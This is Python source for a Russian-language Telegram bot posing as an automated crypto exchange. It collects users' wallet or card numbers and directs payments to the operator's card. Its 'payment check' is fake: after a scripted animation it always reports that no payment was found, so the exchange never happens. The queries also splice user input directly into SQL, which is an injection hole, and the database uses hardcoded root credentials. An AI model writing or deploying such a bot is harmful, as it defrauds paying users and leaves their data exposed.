from multiprocessing.resource_sharer import stop
from tabnanny import check
import telebot
import random
import time
import handlers.config as cfg
from telebot import *
import handlers.database as db
import handlers.validation as valid

token = cfg.BOT_TOKEN
bot = telebot.TeleBot(token)

database = db.connect("localhost","root", "root", "exchange_bot")
cursor = database.cursor()

# * START KEYBOARD
startKeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
startKeyboard.row("⬇️ Список криптовалют ⬇️")
startKeyboard.row("🔄 История операций ", "🎁 Правила обмена")
startKeyboard.row("💰 Актуальные цены", "📖 Поддержка")

# * CANCEL KEYBOARD
cancelKeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
cancelKeyboard.row("🚫 Отменить")



@bot.message_handler(content_types='text')
def startMSG(message):        
    bot.send_message(message.chat.id, reply_markup=startKeyboard, text=f"""⭕️ Добро пожаловать в автоматический обменный пункт {cfg.BOT_NAME}!""", parse_mode='html') 

    bot.register_next_step_handler(message, checkCommand, True)

def checkCancel(message):
    if message.text == "🚫 Отменить":
        return True
    else: 
        pass

def checkCommand(message, start_msg):
    if message.text == "✅ Оплата отправлена":

        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row("✅ Оплата отправлена","🚫 Отменить")

        bot.send_message(message.chat.id, text=f"""*🔍 Проверка оплаты...*""", parse_mode="Markdown")
        time.sleep(0.8)
        bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 1, text=f"""*🔎 Проверка оплаты...*""", parse_mode="Markdown")       
        time.sleep(0.8)
        bot.delete_message(message.chat.id, message_id=message.message_id + 1)
        bot.send_message(chat_id=message.chat.id, reply_markup=keyboard, text=f"""*❌ Оплата не обнаружена. Повторите проверку через 5 минут!*""", parse_mode="Markdown")

    if checkCancel(message):
        startMSG(message)
        return False

    if message.text == "⬇️ Список криптовалют ⬇️": # TODO 
        keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)

        # добавляем выбор валюты
        cryptos = [types.InlineKeyboardButton(i, callback_data=f"coin-{i}") for i in cfg.CRYPTO_LIST.keys()]

        keyboard.add(*cryptos)

        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"⬇️ Выбрать валюту")

        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""💰 Актуальные цены

BTC -> {cfg.BTC_PRICE}
XRP -> {cfg.XRP_PRICE}
TRX -> {cfg.TRX_PRICE}
APT -> {cfg.APT_PRICE}
ETH -> {cfg.ETH_PRICE}
MATIC -> {cfg.MATIC_PRICE}
DOGE -> {cfg.DOGE_PRICE}
LTC -> {cfg.LTC_PRICE}
TWT -> {cfg.TWT_PRICE}
BNB -> {cfg.BNB_PRICE}


🔄 Курс обмена в USD 🔄
""")


    elif message.text == "💰 Актуальные цены": 
        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""💰 Актуальные цены

BTC -> {cfg.BTC_PRICE}
XRP -> {cfg.XRP_PRICE}
TRX -> {cfg.TRX_PRICE}
APT -> {cfg.APT_PRICE}
ETH -> {cfg.ETH_PRICE}
MATIC -> {cfg.MATIC_PRICE}
DOGE -> {cfg.DOGE_PRICE}
LTC -> {cfg.LTC_PRICE}
TWT -> {cfg.TWT_PRICE}
BNB -> {cfg.BNB_PRICE}


🔄 Курс обмена в USD 🔄
""")


    elif message.text == "🔄 История операций":
        cursor.execute(f"SELECT * FROM operations WHERE user_id = {message.chat.id}")

        operations = cursor.fetchall()

        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""🔄 История обменов""")
        for x in operations:
            bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""`Номер:` {x[0]};
`Тип:` {x[1]};
`Монета:` {x[2]};
`Средство вывода:` {x[3]};
`Сумма:` {x[4]} USD;
""", parse_mode="Markdown")


        

    elif message.text == "🎁 Правила обмена":
        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""{cfg.RULES}""")

    elif message.text == "📖 Поддержка":
        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""📖 Поддержка

Если у вас возникли какие-либо сложности при работе с ботом, либо Вы хотели бы задать нам вопрос – наш оператор с радостью поможет Вам разобраться.

{cfg.SUPPORT} (свободный график по выходным)""")

    elif start_msg == True:
        bot.send_message(message.chat.id, reply_markup=startKeyboard, text=f"""⭕️ Воспользуйтесь клавиатурой!""")
        bot.register_next_step_handler(message, checkCommand, True)
    else:
        startMSG(message)





@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    global cancelKeyboard
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)


    if call.data.startswith('coin-'):
        crypto = call.data.partition('-')[2]
        # добавляем выбор действия
        buy = types.InlineKeyboardButton(f'Купить {crypto}', callback_data=f'buy-{crypto}')
        sell = types.InlineKeyboardButton(f'Продать {crypto}', callback_data=f'sell-{crypto}')
        
        keyboard.add(buy, sell)

        bot.send_message(call.message.chat.id, reply_markup=keyboard, text="💬 Выберите действие:")

    if call.data.startswith('buy-'):
        crypto = call.data.partition('-')[2]

        bot.send_message(call.message.chat.id, reply_markup=cancelKeyboard, text="💬 Введите номер своего крипто-кошелька:")
        bot.register_next_step_handler(call.message, getAmount, crypto, "BUY")

    if call.data.startswith('sell-'):
        crypto = call.data.partition('-')[2]

        bot.send_message(call.message.chat.id, reply_markup=cancelKeyboard, text="💬 Введите номер своей карты:")
        bot.register_next_step_handler(call.message, getAmount, crypto, "SELL")


def getAmount(message, crypto, action):
    wallet = message.text

    bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""💬 Укажите количество {crypto}""")

    if action == "BUY":
        bot.register_next_step_handler(message, checkPayInfo, crypto, "BUY", wallet)
        
    elif action == "SELL":
        bot.register_next_step_handler(message, checkPayInfo, crypto, "SELL", wallet)


def checkPayInfo(message, crypto, action, wallet):
    global cursor

    amount = float(message.text)

    if valid.validateBTC(wallet) or valid.validateCard(wallet):
        payStady(message, amount, crypto, action, wallet)
    else:
        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""⚠️ Такого кошелька / карты не существует! Оформите заявку по новой.""")
        startMSG(message)
        return False




def payStady(message, amount, crypto, action, wallet):
    if checkCancel(message):
        startMSG(message)
        return False

    
            
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.row("✅ Оплата отправлена","🚫 Отменить")

    # ? ПОЛУЧАЕМ КОМИСИЮ КРИПТЫ И ДОБАВЛЯЕМ ЕЕ К AMOUNT
    db.execute(cursor, f"SELECT commission FROM coins WHERE name = '{crypto}'")
    commission = cursor.fetchone()
    
    paymentSum = cfg.CRYPTO_LIST[crypto]*amount

    if action == "SELL":
        price = amount
        if(commission[0] > 1):
            price = amount*commission[0]

        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""✅ Заявка {str(random.randrange(100, 40000)).zfill(6)} успешно создана!

    💵 Сумма к получению: {paymentSum} USD
    🏦 Счёт зачисления:
    {wallet}

    ⏺️ Статус заявки:  🟡 Ожидает оплаты

    🕓 Время на оплату:  30 минут
    💵 Сумма к оплате: {price} {crypto}
    🏦 Реквизиты для оплаты: `{cfg.CARD_NUMBER}`""", parse_mode="Markdown")
        


    elif action == "BUY":
        price = paymentSum
        if(commission[0] > 1):
            price = paymentSum*commission[0]
            
        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""✅ Заявка {str(random.randrange(100, 40000)).zfill(6)} успешно создана!

    💵 Сумма к получению: {amount} {crypto}
    🏦 Счёт зачисления:
    {wallet}

    ⏺️ Статус заявки:  🟡 Ожидает оплаты

    🕓 Время на оплату:  30 минут
    💵 Сумма к оплате: `{price}` USD
    🏦 Реквизиты для оплаты: `{cfg.CARD_NUMBER}`""", parse_mode="Markdown")

    bot.register_next_step_handler(message, checkPayment, action, crypto, wallet, price, message.chat.id)




def checkPayment(message, type, coin, wallet, price, user_id):
    global cursor

    if checkCancel(message):
        startMSG(message)
        return False

    if message.text == "✅ Оплата отправлена":
        #? СОХРАНЯЕМ ТРАНЗАКЦИЮ
        sql = f"INSERT INTO `operations` (`id`, `type`, `coin`, `wallet_number`, `amount`, `user_id`) VALUES (NULL, '{type}', '{coin}', '{wallet}', '{price}', '{user_id}');"
        cursor.execute(sql)

        database.commit()
    


        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row("✅ Оплата отправлена","🚫 Отменить")

        bot.send_message(message.chat.id, text=f"""*🔍 Проверка оплаты...*""", parse_mode="Markdown")
        time.sleep(0.8)
        bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 1, text=f"""*🔎 Проверка оплаты...*""", parse_mode="Markdown")       
        time.sleep(0.8)
        bot.delete_message(message.chat.id, message_id=message.message_id + 1)
        bot.send_message(chat_id=message.chat.id, reply_markup=keyboard, text=f"""*❌ Оплата не обнаружена. Повторите проверку через 5 минут!*""", parse_mode="Markdown")
        bot.register_next_step_handler(message, checkPayment, type, coin, wallet, price, user_id)

    else:
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row("✅ Оплата отправлена","🚫 Отменить")

        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""⭕️ Воспользуйтесь клавиатурой!""") 
        bot.register_next_step_handler(message, checkPayment, type, coin, wallet, price, user_id)



if __name__ == '__main__':
    bot.infinity_polling()